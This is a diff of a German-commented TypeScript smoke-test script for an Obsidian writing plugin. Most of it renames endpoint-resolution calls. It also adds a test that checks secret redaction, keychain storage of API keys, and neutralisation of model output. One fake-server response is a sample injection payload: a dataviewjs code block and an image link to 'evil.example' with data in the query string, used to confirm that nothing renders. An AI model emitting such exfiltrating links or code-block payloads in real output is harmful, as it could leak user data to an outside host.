@@ -902,7 +902,7 @@ async function pruefeLauf(cdp: Cdp): Promise<void> {
         // setPluginSetting schreibt nur die Einstellung; der lokale Endpunkt-Cache (`cachedLocal`) und
         // `activeModel` tragen weiter das alte "" — der Panel-Weg (`setModel`) invalidiert, dieser nicht.
         // Ohne das ging `model: ""` an LM Studio (400 "Invalid model identifier"): C1 rot seit Welle 6.
-        await cdp.evaluate(`const p = app.plugins.plugins[${q(PLUGIN_ID)}]; p.invalidateEndpointCache(); await p.resolveEndpoint(); return { ok: true };`);
+        await cdp.evaluate(`const p = app.plugins.plugins[${q(PLUGIN_ID)}]; p.llm.invalidate(); await p.llm.resolve(); return { ok: true };`);
         console.log(`  · Modell fuer diesen Lauf gesetzt: ${gewaehlt} (Einstellung war „Server waehlt", ${ids.length} Modelle geladen)`);
       }
     }
@@ -1162,7 +1162,7 @@ async function installFakeManager(cdp: Cdp, url: string): Promise<void> {
 /** Entfernt die Fake-API — Analog zu `app.plugins.disablePlugin()` (der Brief nennt beides
  *  als gleichwertig fuer M3). `findEndpointManager()` liest bei JEDEM Aufruf frisch aus
  *  `app.plugins.plugins`, ein `changed`-Ereignis ist fuer die Abwesenheit nicht noetig — der
- *  naechste `resolveEndpoint()`/Settings-Rebuild sieht sie ohnehin sofort.
+ *  naechste `llm.resolve()`/Settings-Rebuild sieht sie ohnehin sofort.
  *
  *  Stellt den VOR `installFakeManager()` vorgefundenen Eintrag wieder her (Review-Fund I6),
  *  statt ihn zu loeschen — s. Kommentar dort. Idempotent: ein Aufruf ohne vorheriges
@@ -1371,7 +1371,7 @@ async function pruefeManager(cdp: Cdp, port: number): Promise<void> {
       const p = app.plugins.plugins[${q(PLUGIN_ID)}];
       p.settings.choice = { ...p.settings.choice, model: ${q(gewaehltesModell)} };
       await p.saveSettings();
-      await p.resolveEndpoint();
+      await p.llm.resolve();
       return { ok: true };
     `);
     const okM2b = await laufeTune(cdp);
@@ -1420,12 +1420,11 @@ async function pruefeManager(cdp: Cdp, port: number): Promise<void> {
       const p = app.plugins.plugins[${q(PLUGIN_ID)}];
       p.settings.endpoints = [{ url: ${q(localFake.url)}, model: ${q(LOCAL_FALLBACK_MODEL)} }];
       await p.saveSettings();
-      // invalidateEndpointCache(): resolveEndpoint() cacht den lokalen Pfad (Ersatz fuer den
-      // entfernten EndpointResolver) — ohne die Invalidierung wuerde der naechste Lauf den
+      // llm.invalidate(): die Verbindung merkt die lokale Aufloesung bis dahin — ohne die Invalidierung wuerde der naechste Lauf den
       // laengst gecachten ECHTEN :1234-Endpunkt aus dem allerersten onload() weiterverwenden,
       // die neue Liste bliebe wirkungslos.
-      p.invalidateEndpointCache();
-      await p.resolveEndpoint();
+      p.llm.invalidate();
+      await p.llm.resolve();
       return { ok: true };
     `);
     const okLokal = await laufeTune(cdp);
@@ -1446,8 +1445,8 @@ async function pruefeManager(cdp: Cdp, port: number): Promise<void> {
         if (!p) return { ok: false };
         p.settings.endpoints = ${JSON.stringify(vorherEndpoints)};
         await p.saveSettings();
-        p.invalidateEndpointCache();
-        await p.resolveEndpoint();
+        p.llm.invalidate();
+        await p.llm.resolve();
         return { ok: true };
       `).catch(() => null);
     }
@@ -1540,11 +1539,12 @@ async function pruefeApple(cdp: Cdp, port: number): Promise<void> {
     `);
     const gewaehlt = await pollUntil<{ transport: string | null }>(cdp, `
       const p = app.plugins.plugins[${q(PLUGIN_ID)}];
-      return p.isShortcutsEndpoint() ? { transport: "shortcuts" } : null;
+      const src = await p.llm.resolve();
+      return src.transport === "shortcuts" ? { transport: "shortcuts" } : null;
     `, 8000, 250);
     const hinweis = await stelleText(stelle);
     record(NAMEN[2]!, gewaehlt !== null, gewaehlt !== null
-      ? `isShortcutsEndpoint() wahr; Hinweis zur Grenze im Tab: ${/4096/.test(hinweis) ? "da" : "FEHLT"}`
+      ? `Quelle traegt transport shortcuts; Hinweis zur Grenze im Tab: ${/4096/.test(hinweis) ? "da" : "FEHLT"}`
       : "Quelle blieb HTTP — die Dropdown-Wahl kam nicht an");
     closeSettings(cdp, stelle);
     stelle = null;
@@ -1585,8 +1585,8 @@ async function pruefeApple(cdp: Cdp, port: number): Promise<void> {
       if (!p) return { ok: false };
       p.settings.choice = {};
       await p.saveSettings();
-      p.invalidateEndpointCache();
-      await p.resolveEndpoint();
+      p.llm.invalidate();
+      await p.llm.resolve();
       return { ok: true };
     `).catch(() => null);
     if (fake) await fake.close().catch(() => undefined);
@@ -1611,8 +1611,8 @@ async function pruefeRundenZeile(cdp: Cdp): Promise<void> {
       const p = app.plugins.plugins[${q(PLUGIN_ID)}];
       p.settings.endpoints = [{ url: ${q(fake.url)}, model: "smoke-rounds-model" }];
       await p.saveSettings();
-      p.invalidateEndpointCache();
-      await p.resolveEndpoint();
+      p.llm.invalidate();
+      await p.llm.resolve();
       app.workspace.rightSplit.setSize(300);
       return { ok: true };
     `);
@@ -1646,8 +1646,8 @@ async function pruefeRundenZeile(cdp: Cdp): Promise<void> {
         const p = app.plugins.plugins[${q(PLUGIN_ID)}];
         p.settings.endpoints = ${JSON.stringify(vorher.eps)};
         await p.saveSettings();
-        p.invalidateEndpointCache();
-        await p.resolveEndpoint();
+        p.llm.invalidate();
+        await p.llm.resolve();
         app.workspace.rightSplit.setSize(${Number(vorher.breite)});
         return { ok: true };
       `).catch(() => null);
@@ -1737,8 +1737,8 @@ async function pruefeFallback(cdp: Cdp): Promise<void> {
       const p = app.plugins.plugins[${q(PLUGIN_ID)}];
       p.settings.endpoints = [{ url: ${q(url)}, model: "fb-model" }];
       await p.saveSettings();
-      p.invalidateEndpointCache();
-      await p.resolveEndpoint();
+      p.llm.invalidate();
+      await p.llm.resolve();
       return { ok: true };
     `);
     const ok = await laufeTune(cdp);
@@ -1752,8 +1752,110 @@ async function pruefeFallback(cdp: Cdp): Promise<void> {
         if (!p) return { ok: false };
         p.settings.endpoints = ${JSON.stringify(vorher)};
         await p.saveSettings();
-        p.invalidateEndpointCache();
-        await p.resolveEndpoint();
+        p.llm.invalidate();
+        await p.llm.resolve();
+        return { ok: true };
+      `).catch(() => null);
+    }
+    await new Promise<void>((resolve) => { server.close(() => { resolve(); }); });
+  }
+}
+
+/** V — die Verbindung des Kits (0.51.2): Schwaerzung vor dem Senden, Schluesselbund, Neutralisierung.
+ *  Ein eigener Fake-Server zeichnet auf, WAS auf den Draht ging (Body, Authorization), und spiegelt den
+ *  Platzhalter, den er sah, in seine Antwort. Gemessen wird die Wirkung an drei Stellen: am Draht (V1), in
+ *  `data.json` samt Header am Server (V2) und im gerenderten Panel (V3). */
+async function pruefeVerbindung(cdp: Cdp): Promise<void> {
+  console.log("\nV · Verbindung (Schwaerzung, Schluesselbund, Neutralisierung)");
+  const NAMEN = [
+    "V1 Token geht als Platzhalter an den Server, im Ergebnis steht das Original",
+    "V2 Schluessel steht nicht mehr in data.json, der Server bekommt ihn trotzdem",
+    "V3 Antwort mit Code-Block-Prozessor und Bild rendert als Text",
+  ];
+  const GEHEIM = "smoke0123456789abcdefghij";
+  const KEY = `sk-smoke-${Date.now().toString(36)}-0123456789`;
+  const gesehen: { bodies: string[]; auths: string[] } = { bodies: [], auths: [] };
+  let antwort: (user: string) => string = () => "ok";
+  const server: Server = createServer((req, res) => {
+    res.setHeader("Access-Control-Allow-Origin", "*");
+    res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
+    res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");
+    if (req.method === "OPTIONS") { res.writeHead(204); res.end(); return; }
+    if (req.url?.includes("/v1/models") === true) { res.writeHead(200, { "Content-Type": "application/json" }); res.end(JSON.stringify({ data: [{ id: "v-model", object: "model" }] })); return; }
+    if (req.method === "POST" && req.url?.includes("/v1/chat/completions") === true) {
+      let body = "";
+      req.on("data", (c: Buffer) => { body += c.toString("utf8"); });
+      req.on("end", () => {
+        gesehen.bodies.push(body);
+        gesehen.auths.push(String(req.headers["authorization"] ?? ""));
+        let user = "";
+        try { user = (JSON.parse(body) as { messages: { role: string; content: string }[] }).messages.filter((m) => m.role === "user").map((m) => m.content).join("\n"); } catch { user = ""; }
+        res.writeHead(200, { "Content-Type": "text/event-stream" });
+        res.write(`data: ${JSON.stringify({ choices: [{ delta: { content: antwort(user) }, finish_reason: null }], model: "v-model" })}\n\n`);
+        res.write(`data: ${JSON.stringify({ choices: [{ delta: {}, finish_reason: "stop" }], model: "v-model" })}\n\n`);
+        res.write("data: [DONE]\n\n");
+        res.end();
+      });
+      return;
+    }
+    res.writeHead(404); res.end();
+  });
+  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
+  const url = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
+  let vorher: unknown = null;
+  const datei = ".obsidian/plugins/lingotuner/data.json";
+  try {
+    vorher = (await cdp.evaluate<{ eps: unknown }>(`return { eps: app.plugins.plugins[${q(PLUGIN_ID)}].settings.endpoints };`)).eps;
+    // Ein Endpunkt MIT Schluessel im Klartext (ein Staging-Vault ohne Schluessel misst sonst nichts).
+    await cdp.evaluate(`
+      const p = app.plugins.plugins[${q(PLUGIN_ID)}];
+      p.settings.endpoints = [{ url: ${q(url)}, model: "v-model", apiKey: ${q(KEY)} }];
+      await p.saveSettings();
+      p.llm.invalidate();
+      await p.llm.resolve({ force: true });
+      return { ok: true };
+    `);
+    const data = await pollUntil<{ text: string }>(cdp, `
+      const t = await app.vault.adapter.read(${q(datei)});
+      return t.includes(${q(KEY)}) ? null : { text: t };
+    `, 8000, 250);
+
+    // V1 — ueber die Plugin-API: ein Token in der Eingabe, der Server spiegelt, was er sah.
+    antwort = (user) => `Gesehen: ${/\[redacted-[a-z0-9-]+-\d+\]/.exec(user)?.[0] ?? "KEIN-PLATZHALTER"}`;
+    const r = await cdp.evaluate<{ ok: boolean; text: string }>(`
+      const p = app.plugins.plugins[${q(PLUGIN_ID)}];
+      const r = await p.api.tune("Bitte kuerzen: Authorization: Bearer ${GEHEIM}", { directness: 0, context: 0, social: 2, semantics: 0 });
+      return { ok: r.ok, text: r.ok ? r.text : "" };
+    `);
+    const drahtSauber = gesehen.bodies.length > 0 && gesehen.bodies.every((b) => !b.includes(GEHEIM)) && gesehen.bodies.some((b) => /\[redacted-[a-z0-9-]+-\d+\]/.test(b));
+    record(NAMEN[0]!, r.ok && drahtSauber && r.text.includes(GEHEIM),
+      `Server sah ${gesehen.bodies.length} Anfrage(n), Original im Body: ${gesehen.bodies.some((b) => b.includes(GEHEIM))}, Platzhalter da: ${drahtSauber}, Ergebnis ${JSON.stringify(r.text.slice(0, 60))}`);
+
+    // V2 — Schluesselbund: kein Klartext in data.json, der Header am Server traegt ihn trotzdem.
+    const hatId = data !== null && /"secretId"/.test(data.text);
+    record(NAMEN[1]!, data !== null && !data.text.includes(KEY) && hatId && gesehen.auths.some((a) => a === `Bearer ${KEY}`),
+      `data.json ${data === null ? "traegt den Klartext noch" : "ohne Klartext"}, secretId ${hatId ? "da" : "FEHLT"}, Authorization am Server ${gesehen.auths.some((a) => a === `Bearer ${KEY}`) ? "ok" : `FEHLT (${JSON.stringify(gesehen.auths.map((a) => a.slice(0, 16)))})`}`);
+
+    // V3 — Panel-Lauf: die Antwort traegt einen Code-Block-Prozessor und ein Bild.
+    antwort = () => "```dataviewjs\ndv.paragraph('x')\n```\n\n![x](https://evil.example/?d=geheim)";
+    const ok = await laufeTune(cdp);
+    const dom = await cdp.evaluate<{ img: number; pre: number; text: string }>(`
+      const b = document.querySelector(".okit-stream-body");
+      return { img: b ? b.querySelectorAll("img").length : -1, pre: b ? b.querySelectorAll("pre").length : -1, text: b ? b.textContent : "" };
+    `);
+    record(NAMEN[2]!, ok && dom.img === 0 && dom.pre === 0 && /dataviewjs/.test(dom.text),
+      ok ? `img ${dom.img}, pre ${dom.pre}, Text zeigt „dataviewjs“: ${/dataviewjs/.test(dom.text)}` : `Lauf fehlgeschlagen (${(await text(cdp, ".lt-status")) ?? "?"})`);
+  } catch (e) {
+    for (const n of NAMEN) if (!checks.some((c) => c.name === n)) skipped(n, `Messung abgebrochen: ${(e as Error).message}`);
+  } finally {
+    if (vorher !== null) {
+      await cdp.evaluate(`
+        const p = app.plugins.plugins[${q(PLUGIN_ID)}];
+        if (!p) return { ok: false };
+        p.settings.endpoints = ${JSON.stringify(vorher)};
+        await p.saveSettings();
+        p.llm.invalidate();
+        await p.llm.resolve();
         return { ok: true };
       `).catch(() => null);
     }
@@ -1876,6 +1978,7 @@ async function main(): Promise<void> {
     await pruefeHilfeZeile(cdp, port);
     await pruefeLab(cdp);
     await pruefeFallback(cdp);
+    await pruefeVerbindung(cdp);
     await pruefeAnfrage(cdp, port);
     await pruefeRundenZeile(cdp);
     skipped("Markierung ersetzen (Rand-Whitespace)", "Editor-Selektion per CDP ist im Unit-Test abgedeckt (editor-io.test.ts); im Smoke muesste sie ueber CodeMirror gesetzt werden — Handarbeit");
